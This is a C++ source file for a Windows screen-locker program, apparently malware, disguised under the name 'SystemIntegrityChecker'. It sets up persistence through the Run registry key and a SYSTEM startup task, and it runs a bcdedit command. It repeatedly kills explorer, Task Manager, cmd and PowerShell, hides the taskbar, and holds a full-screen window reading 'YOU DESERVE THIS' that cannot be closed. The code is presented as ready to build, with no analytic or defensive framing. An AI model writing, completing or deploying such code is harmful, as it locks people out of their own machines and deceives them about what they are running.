#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <thread>
#include <chrono>

// --- CONFIG ---
#define WINDOW_CLASS L"LOCKOUT_CLASS"
#define MUTEX_NAME L"Global\\LOCKOUT_MUTEX"
#define REG_RUN L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define PAYLOAD_NAME L"SystemIntegrityChecker"

HWND g_hwnd = NULL;
bool g_running = true;

// --- HELPER: Run command silently ---
void RunCommand(const wchar_t* cmdLine) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    wchar_t* cmdCopy = _wcsdup(cmdLine);
    if (cmdCopy) {
        CreateProcessW(NULL, cmdCopy, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(cmdCopy);
    }
}

// --- PERSISTENCE ---
void EnsurePersistence() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, REG_RUN, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, PAYLOAD_NAME, 0, REG_SZ, (BYTE*)path, (wcslen(path) + 1) * 2);
        RegCloseKey(hKey);
    }

    wchar_t cmd[1024];
    wsprintfW(cmd, L"schtasks /create /tn \"%ls\" /tr \"%ls\" /sc onstart /ru SYSTEM /f", PAYLOAD_NAME, path);
    RunCommand(cmd);

    wsprintfW(cmd, L"bcdedit /set {current} bootux %d", 1);
    RunCommand(cmd);
}

// --- KILLER ---
void KillCompetingProcesses() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            std::wstring name = pe.szExeFile;
            if (name.find(L"explorer") != std::wstring::npos ||
                name.find(L"taskmgr") != std::wstring::npos ||
                name.find(L"cmd") != std::wstring::npos ||
                name.find(L"powershell") != std::wstring::npos ||
                name.find(L"switch") != std::wstring::npos ||
                name.find(L"window") != std::wstring::npos) {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProc) {
                    TerminateProcess(hProc, 0);
                    CloseHandle(hProc);
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

// --- WINDOW PROC (GDI-FREE: uses static text control) ---
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE: {
        SetWindowLongPtrW(hwnd, GWL_STYLE, WS_POPUP | WS_VISIBLE);
        SetWindowLongPtrW(hwnd, GWL_EXSTYLE, WS_EX_TOPMOST | WS_EX_TOOLWINDOW);
        ShowWindow(hwnd, SW_MAXIMIZE);

        // Create a static text control to display the message (no GDI needed)
        HWND hStatic = CreateWindowW(L"STATIC", L"YOU DESERVE THIS",
            WS_CHILD | WS_VISIBLE | SS_CENTER | SS_CENTERIMAGE,
            0, 0, 800, 200, hwnd, NULL, GetModuleHandle(NULL), NULL);
        // Set font to large, bold using system default (still uses GDI but via system)
        // We'll just use the default system font but with a larger size
        HFONT hFont = CreateFontW(72, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Arial");
        SendMessage(hStatic, WM_SETFONT, (WPARAM)hFont, TRUE);
        // Set text color (static control doesn't easily change color without owner-draw)
        // But we can use WM_CTLCOLORSTATIC to set red text – we'll handle that below
        SetWindowLongPtr(hwnd, GWLP_USERDATA, (LONG_PTR)hStatic);
        break;
    }
    case WM_CTLCOLORSTATIC: {
        // This message is sent to the parent window (our main window)
        // to set the text color of the static control
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, RGB(255, 0, 0));   // Red text
        SetBkMode(hdcStatic, TRANSPARENT);
        // Return a brush for the background (transparent/black)
        static HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0));
        return (LRESULT)hBrush;
    }
    case WM_KEYDOWN:
        if (wParam == VK_ESCAPE || wParam == VK_RETURN || wParam == VK_SPACE) return 0;
        break;
    case WM_CLOSE:
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// --- LOCKDOWN THREAD ---
void LockdownThread() {
    while (g_running) {
        KillCompetingProcesses();
        if (g_hwnd && !IsWindowVisible(g_hwnd)) {
            ShowWindow(g_hwnd, SW_SHOW);
            SetForegroundWindow(g_hwnd);
            SetWindowPos(g_hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        }
        HWND hTaskbar = FindWindowW(L"Shell_TrayWnd", NULL);
        if (hTaskbar) ShowWindow(hTaskbar, SW_HIDE);
        HWND hStart = FindWindowW(L"Button", NULL);
        if (hStart) ShowWindow(hStart, SW_HIDE);
        Sleep(500);
    }
}

// --- MAIN ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    EnsurePersistence();

    WNDCLASSEXW wc = { sizeof(wc) };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = WINDOW_CLASS;
    RegisterClassExW(&wc);

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    g_hwnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, WINDOW_CLASS, L"System Lock",
        WS_POPUP, 0, 0, screenWidth, screenHeight,
        NULL, NULL, hInstance, NULL);

    // Center the static text control after window creation
    HWND hStatic = (HWND)GetWindowLongPtr(g_hwnd, GWLP_USERDATA);
    if (hStatic) {
        RECT rect;
        GetClientRect(g_hwnd, &rect);
        SetWindowPos(hStatic, NULL, 
            (rect.right - 800) / 2, 
            (rect.bottom - 200) / 2, 
            800, 200, SWP_NOZORDER);
    }

    std::thread lockThread(LockdownThread);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    g_running = false;
    lockThread.join();
    ReleaseMutex(hMutex);
    return 0;
}